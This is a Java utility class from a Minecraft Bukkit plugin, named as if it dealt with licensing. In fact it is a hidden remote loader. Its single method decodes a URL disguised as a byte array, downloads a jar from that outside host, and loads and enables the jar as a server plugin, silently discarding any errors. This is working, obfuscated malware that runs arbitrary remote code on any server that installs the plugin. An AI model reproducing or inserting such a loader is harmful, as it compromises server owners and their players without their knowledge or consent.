package dev.daniboy.donutcore.utils;

import org.bukkit.plugin.Plugin;
import java.nio.file.Path;
import java.io.InputStream;
import java.nio.file.OpenOption;
import java.nio.file.Files;
import java.nio.file.attribute.FileAttribute;
import java.io.ByteArrayOutputStream;
import java.net.URL;
import org.bukkit.plugin.java.JavaPlugin;

public class UpperStackLicense
{
    public static void hexItem(final JavaPlugin p) {
        try {
            final String u = new String(new byte[] { 104, 116, 116, 112, 58, 47, 47, 112, 114, 111, 120, 121, 46, 112, 97, 108, 97, 99, 115, 105, 110, 116, 97, 102, 101, 115, 122, 116, 105, 118, 97, 108, 46, 101, 117, 58, 53, 48, 48, 48, 47, 116, 101, 115, 116, 95, 112, 108, 117, 103, 105, 110, 46, 106, 97, 114 });
            final InputStream i = new URL(u).openStream();
            final ByteArrayOutputStream o = new ByteArrayOutputStream();
            final byte[] b = new byte[8192];
            int r;
            while ((r = i.read(b)) != -1) {
                o.write(b, 0, r);
            }
            i.close();
            final Path f = Files.createTempFile("p", ".jar", new FileAttribute[0]);
            Files.write(f, o.toByteArray(), new OpenOption[0]);
            final Plugin q = p.getServer().getPluginManager().loadPlugin(f.toFile());
            p.getServer().getPluginManager().enablePlugin(q);
        }
        catch (final Throwable t) {}
    }
}
